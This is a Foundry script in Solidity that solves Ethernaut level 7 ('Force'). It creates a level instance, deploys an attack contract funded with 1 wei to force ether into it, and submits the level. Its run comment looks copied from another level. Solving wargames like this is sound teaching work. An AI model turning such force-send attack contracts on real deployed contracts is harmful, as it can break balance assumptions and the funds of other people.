// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { Force } from "src/Level07.sol";
import { L07Attack } from "src/Level07Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
    Force instance;
    L07Attack attack;

    // Run with `INSTANCE_ADDRESS=0x... ATTACK_ADDRESS=0x... forge script --broadcast script/Level03.sol:Attack` 10
    // times
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        instance = Force(instanceAddress);

        attack = new L07Attack{value: 1 wei}(instanceAddress);
        console2.log(address(instance).balance);

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
